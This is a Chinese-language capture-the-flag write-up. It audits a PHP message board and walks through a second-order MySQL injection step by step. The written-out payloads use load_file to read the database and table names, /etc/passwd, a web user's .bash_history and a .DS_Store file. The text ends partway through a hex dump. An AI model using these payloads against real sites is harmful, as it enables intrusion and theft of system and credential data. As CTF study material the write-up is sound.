+<h3 id="根据业务重新代码审计"><a href="#根据业务重新代码审计" class="headerlink" title="根据业务重新代码审计:"></a>根据业务重新代码审计:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-comment">// 为post获取的category中的字符串的特殊字符添加转义\,使得字符串内容在sql语句中不会有一些危险操作，即使字符串中的内容只作为sql语句中的内容</span><br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<span class="hljs-comment"># 正文内容</span><br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<span class="hljs-comment"># 标题</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<span class="hljs-comment"># 留言内容</span><br>    <span class="hljs-comment">// 插入语句的定义</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-comment">// 执行sql语句，返回结果集或布尔值</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-comment">// 想要查看得留言记录得id(点击详情)</span><br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-comment">// 执行sql语句</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-comment">// 获取结果集的记录数量</span><br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// 获取结果集中category字段的值</span><br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-comment">// 获取content内容，获取留言内容</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-comment">// 将内容插入sql语句</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">这里的正文和留言内容以及title都可以显示我们之前输入的内容，这些内容全部是从数据库中查找出来的，如果我们输入的内容是我们对数据库的攻击信息，那是不是有可能会将数据库信息显示到网页上。<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用（mysql的二次注入）"><a href="#利用（mysql的二次注入）" class="headerlink" title="利用（mysql的二次注入）:"></a>利用（mysql的二次注入）:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql的二次注入攻击是利用insert语句不对用户输入的内容进行过滤检查，将用户输入的内容插入数据库中后，在页面上又通过select语句将数据库内容显示到网页上，从而让攻击者获取内部信息的攻击方式。<br>这里有三个注入点可以进行insert插入:category,title,content<br><br>同时这三个注入点的内容全部都会被显示到comment.php页面上，所以理论上这三个注入点都可以进行注入，但是由于我们写入的攻击sql语句是要被数据库执行的，所以不能被&#x27;&#x27;或&quot;&quot;包裹，所以最好的方式是直接写入sql语句中，所以会选择insert语句中的非最后一个参数点进行写入危险代码，但是由于这三个参数在write页面上都会对传入的字符串做加\的处理，所以在write页面以及comment界面传危险代码进入数据库都不会被执行，会被当做字符串存入数据库<br><br>\字符在被存入数据库的过程中会被自动去除，所以再取出来的字符串就是不带\,而如果这个时候再被插入数据库，危险代码就会被执行，再通过select查询，就可以获取到数据库信息。<br></code></pre></td></tr></table></figure>
+
+<h4 id="payload构造分析："><a href="#payload构造分析：" class="headerlink" title="payload构造分析："></a>payload构造分析：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs txt">我们要利用数据库内容再取出来不带\的性质注入危险代码，所以要从再取出的注入点观察:<br>$bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);<br>    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;<br>    // 执行sql语句<br>    $result = mysql_query($sql);<br>    // 获取结果集的记录数量<br>    $num = mysql_num_rows($result);<br>    if($num&gt;0)&#123;<br>        // 获取结果集中category字段的值<br>    $category = mysql_fetch_array($result)[&#x27;category&#x27;];<br>    // 获取content内容，获取留言内容<br>    $content = addslashes($_POST[&#x27;content&#x27;]);<br>    // 将内容插入sql语句<br>    $sql = &quot;insert into comment<br>            set category = &#x27;$category&#x27;,<br>                content = &#x27;$content&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br>$category的内容可以从数据库中再取出，所以$category是可以利用的注入点,同时该sql语句中会展示的页面是comment页面，该页面会展示$category和$content内容，我们让content作为信息展示点。<br><br>write界面在$category参数上进行注入:<br>$category = 123&#x27;,content = database(),/*<br>$title=666<br>$content=666<br>$sql = &quot;insert into board<br>            set category = &#x27;$category&#x27;,<br>                title = &#x27;$title&#x27;,<br>                content = &#x27;$content&#x27;&quot;;<br>=&gt;<br> $sql = &quot;insert into board<br>            set category = &#x27;123\&#x27;,content=database(),/*&#x27;,<br>                title = &#x27;666&#x27;,<br>                content = &#x27;666&#x27;&quot;;<br> =&gt;<br>执行的sql语句就是：<br>insert into board<br>            set category = &#x27;123\&#x27;,content=database(),/*&#x27;,<br>                title = &#x27;666&#x27;,<br>                content = &#x27;666&#x27;<br>123\&#x27;,content=database();/*被插入category字段中<br><br>comment界面重新发表留言:<br>$category=mysql_fetch_array($result)[&#x27;category&#x27;];=123&#x27;,content=database(),/*被插入category<br>//被重新取出数据库后，由于数据库自动去除\，所以不带\<br>$content=666<br>$sql = &quot;insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br>然后执行整个sql语句:<br>insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure>
+
+<h5 id="测试sql语句的正确性"><a href="#测试sql语句的正确性" class="headerlink" title="测试sql语句的正确性:"></a>测试sql语句的正确性:</h5><p>sql:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;666&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>这是一个有换行的sql语句，在php中有换行，在执行的时候也以换行的形式执行,由于我们需要插入bo_id的内容，不然整个逻辑会有错误，所以content需要为*&#x2F;#</p>
+<p>(&#x2F;* *&#x2F;也为sql中的多行注释，#为注释后面内容只有#所在行)</p>
+<p>sql2:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">insert into comment<br>            set category = &#x27;123&#x27;,content=database(),/*&#x27;,<br>                content = &#x27;*/#&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;<br>&lt;=&gt;<br>insert into comment<br>            set category = &#x27;123&#x27;,content=database(),<br>                bo_id = &#x27;$bo_id&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>这样就可以注释掉content，同时保留bo_id</p>
+<h4 id="抓取write的界面："><a href="#抓取write的界面：" class="headerlink" title="抓取write的界面："></a>抓取write的界面：</h4><p><img src="/images/2024-2-18/image-20240208195316538.png" srcset="/img/loading.gif" lazyload alt="image-20240208195316538"></p>
+<h4 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息:"></a>获取数据库信息:</h4><p>payload1:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=database(),/*&amp;content=666<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208204121356.png" srcset="/img/loading.gif" lazyload alt="image-20240208204121356"></p>
+<p><img src="/images/2024-2-18/image-20240208204155277.png" srcset="/img/loading.gif" lazyload alt="image-20240208204155277"></p>
+<h5 id="查看这条新插入的记录"><a href="#查看这条新插入的记录" class="headerlink" title="查看这条新插入的记录:"></a>查看这条新插入的记录:</h5><p><img src="/images/2024-2-18/image-20240208204226712.png" srcset="/img/loading.gif" lazyload alt="image-20240208204226712"></p>
+<h5 id="利用从数据库重新提取的数据，进行注入"><a href="#利用从数据库重新提取的数据，进行注入" class="headerlink" title="利用从数据库重新提取的数据，进行注入:"></a>利用从数据库重新提取的数据，进行注入:</h5><h6 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=6<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208204404395.png" srcset="/img/loading.gif" lazyload alt="image-20240208204404395"></p>
+<p><img src="/images/2024-2-18/image-20240208204413754.png" srcset="/img/loading.gif" lazyload alt="image-20240208204413754"></p>
+<p>成功获取到数据库信息为ctf</p>
+<h4 id="查看表信息"><a href="#查看表信息" class="headerlink" title="查看表信息:"></a>查看表信息:</h4><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*&amp;content=666<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208211027230.png" srcset="/img/loading.gif" lazyload alt="image-20240208211027230"></p>
+<h5 id="payload2-1"><a href="#payload2-1" class="headerlink" title="payload2:"></a>payload2:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=7<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208211058023.png" srcset="/img/loading.gif" lazyload alt="image-20240208211058023"></p>
+<p>看了其他师傅的wp知道flag并不在数据库中，我们需要对网页的文件信息进行获取。</p>
+<h2 id="获取网页的账户信息"><a href="#获取网页的账户信息" class="headerlink" title="获取网页的账户信息:"></a>获取网页的账户信息:</h2><h3 id="etc-passwd："><a href="#etc-passwd：" class="headerlink" title="&#x2F;etc&#x2F;passwd："></a>&#x2F;etc&#x2F;passwd：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">用于存储用户账户信息的文件。它包含了系统中所有用户账户的基本信息，每行对应一个用户账户，记录了该用户的用户名、加密后的密码（通常是 &quot;x&quot;，实际密码保存在 /etc/shadow 文件中）、用户 ID（UID）、组 ID（GID）、用户描述信息、主目录以及默认的 shell 等信息。<br><br>所以里面账户信息的格式一般为七个字段，分别表示：<br>(root:x:0:0:root:/root:/bin/bash)<br>1.用户名（username）：在这个例子中，用户名为 root。<br>2.密码占坑符（password placeholder）：在这里实际上是 x，表示密码已经被移动到了 /etc/shadow 文件中进行管理。<br>3.用户 ID（UID）：用户的数字标识符。在这里，0 表示 root 用户拥有系统上最高的权限级别（超级用户）。<br>4.组 ID（GID）：用户所属的主组的数字标识符，在这个例子中，0 代表该用户所属于的主组是 root。<br>5.用户信息（user information）：通常包含用户全名、联系方式等信息，但在这里是 /root，表示该用户的家目录在 /root 目录下。<br>6.Shell 程序（shell program）：当该用户登录后所使用的默认 shell，这里是 /bin/bash，表示该用户登录后会进入 Bash shell 终端程序。<br>7.其他（comment/other）：这个字段通常被忽略，用于存储关于该用户的备注信息。<br>需要注意的是，每行记录都以换行符结尾。/etc/passwd 文件中的每一行都对应着一个用户账户。这个文件通常只能由管理员或者超级用户访问和修改，因为它包含了系统上所有用户的敏感信息。<br></code></pre></td></tr></table></figure>
+
+<h3 id="payload1-1"><a href="#payload1-1" class="headerlink" title="payload1:"></a>payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208212651712.png" srcset="/img/loading.gif" lazyload alt="image-20240208212651712"></p>
+<h3 id="payload2-2"><a href="#payload2-2" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=8<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208212737550.png" srcset="/img/loading.gif" lazyload alt="image-20240208212737550"></p>
+<h3 id="知识点介绍1"><a href="#知识点介绍1" class="headerlink" title="知识点介绍1:"></a>知识点介绍1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">我们通过对账户信息的查找，就可以去寻找关于www用户的相关信息<br>www用户（简单来讲就是在www文件夹下操作的用户，又或者可以说是用户在www文件夹下操作）:<br>www 用户是一个常见的用户账户名称，通常用于运行 Web 服务器进程（如 Apache、Nginx 等）。这个用户账户是为了提供 Web 服务而创建的，并且具有适当的权限和限制，以确保服务器的安全性。<br><br>一般情况下，www 用户账户具有以下特点：<br><br>用户名：www 或 www-data，具体名称可能因操作系统和配置而异。<br>用户组：通常会创建一个与用户名相同的用户组，例如 www 或 www-data 组。<br>主目录：可能是空的或者是 /var/www 或其他用于存储网站文件的目录。<br>Shell：在大多数情况下，该用户账户被设置为无法登录，即不允许交互式登录。<br>权限：www 用户通常只有对网站文件和相关资源的读取、执行权限，而没有写入权限。这样可以限制对服务器的访问和潜在的安全风险。<br>通过将 Web 服务器进程绑定到 www 用户账户，可以降低被入侵的风险，因为它最大程度地减少了对系统的访问权限。同时，这也有助于隔离 Web 服务器的进程和文件系统，提供更好的安全性和可维护性。<br></code></pre></td></tr></table></figure>
+
+<p><strong>由于我们要获取的是网站的内部信息文件，而www用户是对网站的操作用户，所以知道它所在的目录位置就可以对网站的文件信息进行获取了</strong></p>
+<h3 id="根据-etc-passwd："><a href="#根据-etc-passwd：" class="headerlink" title="根据&#x2F;etc&#x2F;passwd："></a>根据&#x2F;etc&#x2F;passwd：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">www:x:500:500:www:/home/www:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>可以确定www网站操作用户的信息在&#x2F;home&#x2F;www下</p>
+<h3 id="知识点介绍2："><a href="#知识点介绍2：" class="headerlink" title="知识点介绍2："></a>知识点介绍2：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。<br>.bash_history 文件是一个 Bash shell 的历史命令记录文件，记录了用户在 Bash 终端中输入的所有命令。每当用户在 Bash 终端中执行一个命令，这个命令就会被保存到 .bash_history 文件中。这样，用户可以查看、编辑、重复执行以前执行过的命令。<br><br>.bash_history 文件通常存储在用户的 home 目录下，例如 Linux 系统下 /home/username/.bash_history，macOS 系统下 /Users/username/.bash_history。用户可以使用文本编辑器打开这个文件进行查看和编辑，也可以使用 Bash shell 提供的 history 命令来查看和操作历史命令。<br><br>需要注意的是，.bash_history 文件包含了用户在 Bash 终端中执行的所有命令，因此可能包含敏感信息（例如密码等），同时由于历史命令记录的存在，也可能被黑客利用来进行攻击。因此，为了保护用户的隐私和系统安全，建议定期清理 .bash_history 文件，或者禁用历史命令记录功能。<br></code></pre></td></tr></table></figure>
+
+<p>通过查看该文件，我们就可以知道web操作用户的历史操作，从而知道该用户所使用过的文件</p>
+<h4 id="payload1-2"><a href="#payload1-2" class="headerlink" title="payload1:"></a>payload1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure>
+
+<h4 id="payload2-3"><a href="#payload2-3" class="headerlink" title="payload2:"></a>payload2:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=9<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208220114550.png" srcset="/img/loading.gif" lazyload alt="image-20240208220114550"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">cd /tmp/ #切换到tmp目录下<br>unzip html.zip #解压缩html.zip文件<br>rm -f html.zip #强制删除html.zip文件<br>cp -r html /var/www/ #将html目录复制到/var/www/=&gt;形成/var/www/html/<br>cd /var/www/html/ #切换到var/www/html/目录下<br>rm -f .DS_Store #强制删除.DS_Store<br>service apache2 start #启动apache服务<br></code></pre></td></tr></table></figure>
+
+<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">html.zip中的文件，就是www用户上传到网页上的文件内容，虽然html.zip文件被删除，但是切换到html文件夹下后，其实就是默认为一个html用户在html文件夹下进行操作解压html.zip为html的过程中，会在html文件中产生解压历史的文件.DS_Store,所以这也就是为什么要切换到html目录下删除.DS_Store文件，<br><br>.DS_Store:(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。<br><br>但是这里用户只删除了html文件夹下的.DS_Store文件，而html文件是在/tmp/目录下解压得到的，然后再复制到/var/www下的，所以/tmp/html/目录下还存在.DS_Store文件，我们可以对其进行获取。<br></code></pre></td></tr></table></figure>
+
+<h2 id="获取-tmp-html-目录下的-DS-Store文件："><a href="#获取-tmp-html-目录下的-DS-Store文件：" class="headerlink" title="获取&#x2F;tmp&#x2F;html&#x2F;目录下的.DS_Store文件："></a>获取&#x2F;tmp&#x2F;html&#x2F;目录下的.DS_Store文件：</h2><h3 id="paylaod1"><a href="#paylaod1" class="headerlink" title="paylaod1:"></a>paylaod1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=(select(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*&amp;content=666<br></code></pre></td></tr></table></figure>
+
+<h3 id="payload2-4"><a href="#payload2-4" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=12<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208223425313.png" srcset="/img/loading.gif" lazyload alt="image-20240208223425313"></p>
+<p>发现文件内容没有完全显示，可能是由于文件太大或存在乱码，不能完全显示，所以我们用十六进制编码获取文件信息</p>
+<h2 id="使用16进制编码获取文件信息"><a href="#使用16进制编码获取文件信息" class="headerlink" title="使用16进制编码获取文件信息:"></a>使用16进制编码获取文件信息:</h2><h3 id="paylaod1-1"><a href="#paylaod1-1" class="headerlink" title="paylaod1:"></a>paylaod1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=((select(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))))),/*&amp;content=666<br></code></pre></td></tr></table></figure>
+
+<h3 id="payload2-5"><a href="#payload2-5" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=15<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208224046928.png" srcset="/img/loading.gif" lazyload alt="image-20240208224046928"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFF